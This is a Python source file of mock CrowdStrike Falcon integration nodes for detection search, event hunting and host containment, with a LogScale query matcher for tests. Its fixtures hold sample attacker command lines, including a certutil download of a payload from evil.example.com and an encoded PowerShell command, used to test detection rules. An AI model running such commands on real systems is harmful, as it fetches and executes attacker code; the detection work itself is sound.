"""CrowdStrike Falcon integration nodes.

Ports representative tools from the existing
``agents/btagent_agents/mcp/servers/crowdstrike_mcp.py`` MCP server to
the engine Node model:

* ``CrowdStrikeListDetectionsNode`` -- list current Falcon detections.
* ``CrowdStrikeEventSearchNode`` -- run a Falcon LogScale query over raw
  endpoint telemetry (ProcessRollup2 and similar event streams).
* ``CrowdStrikeIsolateHostNode`` -- network-contain a host (the
  representative containment action; in production this composes with
  the HITL middleware in front of the Runner).

The fixtures are intentionally minimal -- just enough for tests to
assert the schema shape. The richer agents/ fixtures stay in the agents/
tree until Sprint 3 cuts over.
"""

from __future__ import annotations

import os
import re
from typing import Any

from pydantic import BaseModel, Field

from btagent_engine.integrations._manifests import CROWDSTRIKE_MANIFEST
from btagent_engine.node import (
    Node,
    NodeCategory,
    NodeContext,
    NodeMeta,
    NodeRegistry,
)


def _mock_mode_enabled() -> bool:
    """Resolve the mock-mode flag at call time so tests can flip it."""
    return os.getenv("BTAGENT_MOCK_CONNECTORS", "true").lower() == "true"


# ---------------------------------------------------------------------------
# Mock fixtures
# ---------------------------------------------------------------------------

_MOCK_DETECTIONS: list[dict[str, Any]] = [
    {
        "detection_id": "ldt:abcdef123456:1001",
        "created_timestamp": "2026-03-26T08:21:50Z",
        "max_severity": 90,
        "severity": "critical",
        "status": "new",
        "hostname": "WS-JSMITH-PC",
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "tactic": "Execution",
        "technique": "PowerShell",
        "technique_id": "T1059.001",
    },
    {
        "detection_id": "ldt:abcdef123456:1002",
        "created_timestamp": "2026-03-26T07:55:30Z",
        "max_severity": 70,
        "severity": "high",
        "status": "new",
        "hostname": "WS-JSMITH-PC",
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "tactic": "Defense Evasion",
        "technique": "Obfuscated Files or Information",
        "technique_id": "T1027",
    },
]

# Severity rank for filtering. Anything below the requested floor is
# dropped from the result set.
_SEVERITY_RANK: dict[str, int] = {
    "low": 30,
    "medium": 50,
    "high": 70,
    "critical": 90,
}

_MOCK_HOSTS: dict[str, dict[str, Any]] = {
    "WS-JSMITH-PC": {
        "device_id": "dev_01HXR4ABCDEF1234567890",
        "hostname": "WS-JSMITH-PC",
    },
}

# Realistic ProcessRollup2-style raw endpoint events for the event_search mock.
# Fields match Falcon LogScale schema so the hunting-runner entity / observable
# extractors (ComputerName -> host, UserName -> user, SHA256HashData -> hash)
# can find their values without any adapter shim.
#
# Timestamps are expressed as offsets from now (in minutes) so the mock stays
# fresh regardless of when the tests run.  The third event is >48h old so that
# tests asserting lookback filtering can use a short window and expect 0 results.
#
# Each event is designed to match a DIFFERENT pack rule's transpiled LogScale query:
#   Event 1 (30 min): matches the encoded-powershell rule
#       (#event_simpleName=ProcessRollup2, ImageFileName=...powershell.exe,
#        CommandLine contains ' -enc ')
#   Event 2 (90 min): matches the certutil-remote-download LOLBin rule
#       (#event_simpleName=ProcessRollup2, ImageFileName=...certutil.exe,
#        CommandLine contains 'urlcache' AND 'http')
#   Event 3 (2940 min, >48h): background noise — ProcessRollup2 but matches
#       neither the encoded-powershell nor the certutil predicates, used by
#       lookback-window tests (lookback_hours=72 exposes all three).
#
# All three carry event_platform=Win so the full LogScale predicate emitted by
# pySigma + crowdstrike_falcon_pipeline is satisfied.
_MOCK_ENDPOINT_EVENT_TEMPLATES: list[tuple[int, dict[str, Any]]] = [
    # (age_minutes, static_fields)
    (
        30,
        {
            # Matches encoded_powershell rule:
            #   event_platform=/^Win$/i
            #   #event_simpleName=/^ProcessRollup2$/i
            #   ImageFileName=/\\powershell\.exe$/i
            #   CommandLine=/ -enc /i
            "event_platform": "Win",
            "event_simpleName": "ProcessRollup2",
            "ComputerName": "WS-JSMITH-PC",
            "UserName": "jsmith",
            "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
            "SHA256HashData": "abc1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcd",
            "ParentImageFileName": "\\Device\\HarddiskVolume3\\Windows\\explorer.exe",
            "MD5HashData": "d41d8cd98f00b204e9800998ecf8427e",
            "TargetProcessId": "4812",
            "cid": "cid_abc123",
        },
    ),
    (
        90,
        {
            # Matches certutil_remote_download (LOLBin) rule:
            #   event_platform=/^Win$/i
            #   #event_simpleName=/^ProcessRollup2$/i
            #   ImageFileName=/\\certutil\.exe$/i
            #   CommandLine=/urlcache/i   (urlcache OR verifyctl)
            #   CommandLine=/http/i
            "event_platform": "Win",
            "event_simpleName": "ProcessRollup2",
            "ComputerName": "SRV-BUILD-02",
            "UserName": "build_svc",
            "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -f http://evil.example.com/payload.exe C:\\Temp\\payload.exe",
            "SHA256HashData": "def4567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12",
            "ParentImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
            "MD5HashData": "098f6bcd4621d373cade4e832627b4f6",
            "TargetProcessId": "3904",
            "cid": "cid_abc123",
        },
    ),
    (
        # >48h old — background noise used by the lookback-filter test.
        # ProcessRollup2 so `#event_simpleName=ProcessRollup2` queries still count it
        # when lookback_hours=72, but it matches neither the powershell-enc nor the
        # certutil predicates (cmd.exe with a benign command, no -enc / urlcache / http).
        2940,
        {
            "event_platform": "Win",
            "event_simpleName": "ProcessRollup2",
            "ComputerName": "SRV-WEBAPP-01",
            "UserName": "svc_web",
            "ImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\net.exe",
            "CommandLine": "net.exe localgroup administrators",
            "SHA256HashData": "fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210fe",
            "ParentImageFileName": "\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
            "MD5HashData": "a87ff679a2f3e71d9181a67b7542122c",
            "TargetProcessId": "2248",
            "cid": "cid_abc123",
        },
    ),
]


# ---------------------------------------------------------------------------
# LogScale predicate matcher (mock path only)
# ---------------------------------------------------------------------------

# Tokeniser for Falcon LogScale queries emitted by pySigma LogScaleBackend +
# crowdstrike_falcon_pipeline.  Handles the key complication: regex literals
# may contain whitespace (e.g. ``CommandLine=/ -enc /i``), so simple
# ``str.split()`` is insufficient.
#
# Token types matched in priority order:
#   keyword   — bare ``or`` or ``not`` (case-insensitive, word boundary)
#   predicate — ``[#@]?field=/.../flags`` or ``field=literal``
#   skip      — any other non-whitespace token (parens, pipe, etc.)
#   whitespace — consumed silently
#
# Supported predicate subset (covers all four windows_baseline pack rules
# as of 2026-06):
#
#   field=/regex/[i]   — regex match; 'i' flag → case-insensitive
#   #field=/regex/[i]  — same; '#' prefix stripped for fixture-key lookup
#   field=literal      — exact equality (e.g. EventID=4625, LogonType=3)
#
# NOT supported (skipped silently from extraction):
#   parenthesised OR/AND groups
#   deferred pipe expressions (| cidr, | in, …)
#   NOT / negation tokens
#
# Top-level (unparenthesised) ``or`` is fully handled: adjacent predicates
# separated by ``or`` form OR-groups; all OR-groups are AND-joined.
# If a nonempty query yields zero parseable predicates the mock returns [] so
# tests cannot accidentally get a "match-everything" result from an unparsed rule.
_QUERY_TOKEN_RE = re.compile(
    r"""
    \s+                              # whitespace — skip
    | (?P<keyword>or|not) (?=\s|$)  # bare 'or' / 'not' keyword (word boundary)
    | (?P<predicate>                 # field = /regex/flags  or  field = literal
        [#@]? [\w.]+                 #   field name (optional # or @ prefix)
        =                            #   equals sign
        (?:
            / (?:[^/\\] | \\.)*? /  #   /regex/ — lazy, handles \/ and \\ escapes
            [a-z]*                   #   optional flags, e.g. 'i'
          | [^\s]+                   #   bare literal value (no whitespace)
        )
      )
    | (?P<skip> \S+ )                # anything else — skip
    """,
    re.VERBOSE,
)

# Extracts (field, regex_body, flags) or (field, literal) from a predicate token.
_PREDICATE_PARTS_RE = re.compile(
    r"""
    ^ (?P<field> [#@]? [\w.]+ ) =
    (?:
        / (?P<regex> (?: [^/\\] | \\. )* ) / (?P<flags> [a-z]* )
      | (?P<literal> .+ )
    ) $
    """,
    re.VERBOSE | re.DOTALL,
)


def _parse_predicate(token: str) -> tuple[str, re.Pattern[str]] | None:
    """Parse one LogScale predicate token into ``(field_key, compiled_pattern)``.

    Returns ``None`` for unrecognised tokens (keywords, parens, etc.).

    Field lookup normalisation: the ``#`` prefix used for Falcon metadata
    fields (e.g. ``#event_simpleName``) is stripped so the key matches the
    plain name stored in the fixture dicts (``event_simpleName``).
    """
    m = _PREDICATE_PARTS_RE.match(token)
    if m is None:
        return None

    raw_field = m.group("field")
    field_key = raw_field.lstrip("#@")  # '#event_simpleName' → 'event_simpleName'

    regex_body = m.group("regex")
    flags_str = m.group("flags") or ""
    literal = m.group("literal")

    if regex_body is not None:
        re_flags = re.IGNORECASE if "i" in flags_str else 0
        try:
            pattern = re.compile(regex_body, re_flags)
        except re.error:
            return None  # Malformed regex body → skip this term
        return field_key, pattern

    if literal is not None:
        # Equality: exact match, case-insensitive to mirror LogScale semantics.
        try:
            pattern = re.compile(f"^{re.escape(literal)}$", re.IGNORECASE)
        except re.error:
            return None
        return field_key, pattern

    return None


def _build_and_clauses(
    query: str,
) -> list[list[tuple[str, re.Pattern[str]]]] | None:
    """Parse *query* into AND-clauses (each a list of OR-alternatives).

    Returns ``None`` when the query is nonempty but yielded zero parseable
    predicates — the caller should return ``[]`` (match nothing) in that case.

    Algorithm
    ---------
    Scan tokens produced by :data:`_QUERY_TOKEN_RE` left-to-right:

    * A ``keyword=or`` token sets ``join_next=True``: the following predicate
      extends the *current* OR-group instead of starting a new AND-clause.
    * ``keyword=not`` and ``skip`` tokens are consumed silently; they do not
      flush the current OR-group.
    * Each new predicate that is *not* OR-joined flushes the current OR-group
      to ``and_clauses`` and opens a fresh one.

    Example — encoded-powershell query parsed into AND-clauses::

        [[(event_platform, /^Win$/i)],
         [(#event_simpleName, /^ProcessRollup2$/i),
          (#event_simpleName, /^SyntheticProcessRollup2$/i)],  # OR-group
         [(ImageFileName, /\\powershell\\.exe$/i),
          (ImageFileName, /\\pwsh\\.exe$/i)],                   # OR-group
         [(CommandLine, / -enc /i),
          (CommandLine, / -EncodedCommand /i),
          (CommandLine, / -e JAB/i)]]                           # OR-group

    An event matches when it satisfies *all* AND-clauses (AND of ORs).
    """
    and_clauses: list[list[tuple[str, re.Pattern[str]]]] = []
    current_or_group: list[tuple[str, re.Pattern[str]]] = []
    join_next = False  # True when the previous meaningful token was 'or'

    for tok_match in _QUERY_TOKEN_RE.finditer(query):
        keyword = tok_match.group("keyword")
        predicate_tok = tok_match.group("predicate")

        if keyword is not None:
            if keyword.lower() == "or":
                join_next = True
            # 'not' and any other keywords: skip without changing join state.
            continue

        if predicate_tok is not None:
            parsed = _parse_predicate(predicate_tok)
            if join_next:
                join_next = False
                if parsed is not None:
                    current_or_group.append(parsed)
                # If the token after 'or' is unrecognised, skip it without
                # flushing — subsequent terms still AND-join.
            else:
                # New AND-clause: flush the current OR-group first.
                if current_or_group:
                    and_clauses.append(current_or_group)
                current_or_group = [parsed] if parsed is not None else []
            continue

        # 'skip' group or whitespace: consume silently, do not affect join state.

    if current_or_group:
        and_clauses.append(current_or_group)

    if not and_clauses and query.strip():
        # Nonempty query but zero extractable predicates → signal match-nothing.
        return None

    return and_clauses


def _event_matches_query(event: dict[str, Any], query: str) -> bool:
    """Return ``True`` iff *event* satisfies the LogScale *query* predicates.

    Matching semantics
    ------------------
    * Empty query → matches everything (no predicates to evaluate).
    * Nonempty query with zero parseable predicates → matches nothing (safety
      guard: an unrecognised syntax never silently returns all fixtures).
    * Field lookup is case-insensitive: ``#event_simpleName`` → ``event_simplename``
      lookup, ``ImageFileName`` → ``imagefilename``.
    * An AND-clause whose field is absent from the event is *not* satisfied
      (missing field ≠ "don't care").
    """
    if not query.strip():
        return True  # empty query → no filter

    and_clauses = _build_and_clauses(query)
    if and_clauses is None:
        return False  # nonempty but unparseable → match nothing

    # Case-insensitive field lookup.
    lower_event: dict[str, Any] = {k.lower(): v for k, v in event.items()}

    for or_group in and_clauses:
        satisfied = False
        for field_key, pattern in or_group:
            raw_value = lower_event.get(field_key.lower())
            if raw_value is None:
                continue  # Field absent → this alternative doesn't match
            if pattern.search(str(raw_value)):
                satisfied = True
                break
        if not satisfied:
            return False  # AND-clause not satisfied → event doesn't match

    return True


def _build_mock_endpoint_events() -> list[dict[str, Any]]:
    """Return mock events with timestamps generated relative to *now*."""
    from datetime import UTC, datetime, timedelta

    now = datetime.now(UTC)
    result: list[dict[str, Any]] = []
    for age_minutes, fields in _MOCK_ENDPOINT_EVENT_TEMPLATES:
        ts = now - timedelta(minutes=age_minutes)
        result.append({"timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"), **fields})
    return result


# ---------------------------------------------------------------------------
# Schemas: event_search
# ---------------------------------------------------------------------------


class CrowdStrikeEventSearchInput(BaseModel):
    query: str = Field(
        ...,
        description=(
            "Falcon LogScale / event-search query string "
            "(e.g. '#event_simpleName=ProcessRollup2 ImageFileName=/powershell.exe/'). "
            "Accepts the full LogScale filter syntax used by Falcon Insight event search."
        ),
        examples=["#event_simpleName=ProcessRollup2"],
    )
    lookback_hours: int = Field(
        default=24,
        ge=1,
        description="Look-back window in hours relative to now (maps to LogScale start/end time).",
    )
    max_events: int = Field(
        default=100,
        ge=1,
        description="Maximum number of raw endpoint events to return.",
    )


class CrowdStrikeEventSearchOutput(BaseModel):
    events: list[dict[str, Any]] = Field(
        default_factory=list,
        description="Raw Falcon LogScale endpoint events. Empty list when nothing matched.",
    )
    count: int = Field(
        default=0,
        description="Number of events returned (after max_events truncation).",
    )
    truncated: bool = Field(
        default=False,
        description="True if the search had more matches than max_events and they were dropped.",
    )


# ---------------------------------------------------------------------------
# Schemas: list_detections
# ---------------------------------------------------------------------------


class CrowdStrikeListDetectionsInput(BaseModel):
    severity: str = Field(
        default="all",
        description="Minimum severity floor: 'critical' | 'high' | 'medium' | 'low' | 'all'.",
    )
    limit: int = Field(
        default=50,
        ge=1,
        description="Maximum number of detections to return.",
    )


class CrowdStrikeListDetectionsOutput(BaseModel):
    detections: list[dict[str, Any]] = Field(
        default_factory=list,
        description="Matching Falcon detections. Empty list when nothing matched.",
    )
    count: int = Field(
        default=0,
        description="Number of detections returned (after limit truncation).",
    )


# ---------------------------------------------------------------------------
# Schemas: isolate_host
# ---------------------------------------------------------------------------


class CrowdStrikeIsolateHostInput(BaseModel):
    hostname: str = Field(
        ...,
        description="Hostname to network-contain via Falcon.",
        examples=["WS-JSMITH-PC"],
    )


class CrowdStrikeIsolateHostOutput(BaseModel):
    hostname: str = Field(..., description="Echo of the targeted hostname.")
    device_id: str | None = Field(
        default=None,
        description="Falcon device id if the host was found, None otherwise.",
    )
    contained: bool = Field(
        default=False,
        description="True if the host was successfully placed in network containment.",
    )
    status: str = Field(
        default="not_found",
        description="One of 'contained' | 'not_found' (mock); production may add 'pending'.",
    )


# ---------------------------------------------------------------------------
# Nodes
# ---------------------------------------------------------------------------


@NodeRegistry.register
class CrowdStrikeEventSearchNode(Node[CrowdStrikeEventSearchInput, CrowdStrikeEventSearchOutput]):
    """Run a Falcon LogScale query over raw CrowdStrike endpoint telemetry.

    Executes an event-search query against Falcon Insight's raw event stream
    (ProcessRollup2, NetworkConnectIP4, DnsRequest, etc.), returning the
    matching raw events for downstream enrichment and entity extraction.

    Mock path returns ProcessRollup2-style fixtures so the hunting runner's
    entity / observable extractors find host (ComputerName), user (UserName),
    and hash (SHA256HashData) values. The lookback and max_events caps are
    honoured: events older than ``lookback_hours`` are filtered out and the
    result list is sliced to ``max_events``.
    """

    meta = NodeMeta(
        id="integration.crowdstrike.event_search",
        name="CrowdStrike: Event Search",
        version="0.1.0",
        category=NodeCategory.INTEGRATION,
        description=(
            "Execute a Falcon LogScale query over raw endpoint telemetry. "
            "Returns matching events plus a truncation flag when the result "
            "set exceeds max_events."
        ),
    )
    input_schema = CrowdStrikeEventSearchInput
    output_schema = CrowdStrikeEventSearchOutput
    manifest = CROWDSTRIKE_MANIFEST
    capability_id = "event_search"

    async def run(
        self,
        input: CrowdStrikeEventSearchInput,
        ctx: NodeContext,
    ) -> CrowdStrikeEventSearchOutput:
        if _mock_mode_enabled():
            from datetime import UTC, datetime, timedelta

            cutoff = datetime.now(UTC) - timedelta(hours=input.lookback_hours)

            pool: list[dict[str, Any]] = []
            for event in _build_mock_endpoint_events():
                ts_raw = event.get("timestamp", "")
                try:
                    # Parse ISO timestamp; treat naive as UTC.
                    ts = datetime.fromisoformat(ts_raw.replace("Z", "+00:00"))
                    if ts < cutoff:
                        continue
                except (ValueError, AttributeError):
                    pass  # Unparseable timestamps pass through (do not filter).

                # Apply LogScale predicate matching against the query.
                # Nonempty queries with zero parseable predicates return nothing;
                # empty queries pass all time-filtered events through.
                if not _event_matches_query(event, input.query):
                    continue

                pool.append(event)

            truncated = len(pool) > input.max_events
            events = pool[: input.max_events]
            return CrowdStrikeEventSearchOutput(
                events=events,
                count=len(events),
                truncated=truncated,
            )

        raise NotImplementedError(
            "CrowdStrike live event-search integration ships in Sprint 4 follow-up; "
            "set BTAGENT_MOCK_CONNECTORS=true to use mock fixtures."
        )


@NodeRegistry.register
class CrowdStrikeListDetectionsNode(
    Node[CrowdStrikeListDetectionsInput, CrowdStrikeListDetectionsOutput]
):
    """List current CrowdStrike Falcon detections, optionally filtered by severity."""

    meta = NodeMeta(
        id="integration.crowdstrike.list_detections",
        name="CrowdStrike: List Detections",
        version="0.1.0",
        category=NodeCategory.INTEGRATION,
        description="Retrieve Falcon detections at or above a given severity. "
        "Returns the raw detection payloads plus a count.",
    )
    input_schema = CrowdStrikeListDetectionsInput
    output_schema = CrowdStrikeListDetectionsOutput
    manifest = CROWDSTRIKE_MANIFEST
    capability_id = "list_detections"

    async def run(
        self,
        input: CrowdStrikeListDetectionsInput,
        ctx: NodeContext,
    ) -> CrowdStrikeListDetectionsOutput:
        if _mock_mode_enabled():
            sev = input.severity.lower()
            if sev == "all":
                pool = list(_MOCK_DETECTIONS)
            else:
                floor = _SEVERITY_RANK.get(sev)
                if floor is None:
                    # Unknown severity -> documented empty shape.
                    return CrowdStrikeListDetectionsOutput(detections=[], count=0)
                pool = [d for d in _MOCK_DETECTIONS if d["max_severity"] >= floor]
            detections = pool[: input.limit]
            return CrowdStrikeListDetectionsOutput(
                detections=detections,
                count=len(detections),
            )

        raise NotImplementedError(
            "CrowdStrike live API integration ships in Sprint 2 follow-up; "
            "set BTAGENT_MOCK_CONNECTORS=true to use mock fixtures."
        )


@NodeRegistry.register
class CrowdStrikeIsolateHostNode(Node[CrowdStrikeIsolateHostInput, CrowdStrikeIsolateHostOutput]):
    """Network-contain a host via CrowdStrike Falcon.

    This is a destructive containment action; in a real deployment the
    Runner should be configured with a HITL middleware that gates this
    node on analyst approval. The Node itself does not enforce HITL --
    that's the middleware's job, see ``btagent_engine.middleware``.
    """

    meta = NodeMeta(
        id="integration.crowdstrike.isolate_host",
        name="CrowdStrike: Isolate Host",
        version="0.1.0",
        category=NodeCategory.INTEGRATION,
        description="Place a host in Falcon network containment. The agent "
        "remains operational for remote investigation, but all "
        "non-Falcon network traffic is blocked. Compose with HITL "
        "middleware before running in production.",
    )
    input_schema = CrowdStrikeIsolateHostInput
    output_schema = CrowdStrikeIsolateHostOutput
    manifest = CROWDSTRIKE_MANIFEST
    capability_id = "isolate_host"

    async def run(
        self,
        input: CrowdStrikeIsolateHostInput,
        ctx: NodeContext,
    ) -> CrowdStrikeIsolateHostOutput:
        if _mock_mode_enabled():
            host = _MOCK_HOSTS.get(input.hostname)
            if host is None:
                # Documented empty / fall-through shape for unknown hosts.
                return CrowdStrikeIsolateHostOutput(
                    hostname=input.hostname,
                    device_id=None,
                    contained=False,
                    status="not_found",
                )
            return CrowdStrikeIsolateHostOutput(
                hostname=input.hostname,
                device_id=host["device_id"],
                contained=True,
                status="contained",
            )

        raise NotImplementedError(
            "CrowdStrike live API integration ships in Sprint 2 follow-up; "
            "set BTAGENT_MOCK_CONNECTORS=true to use mock fixtures."
        )
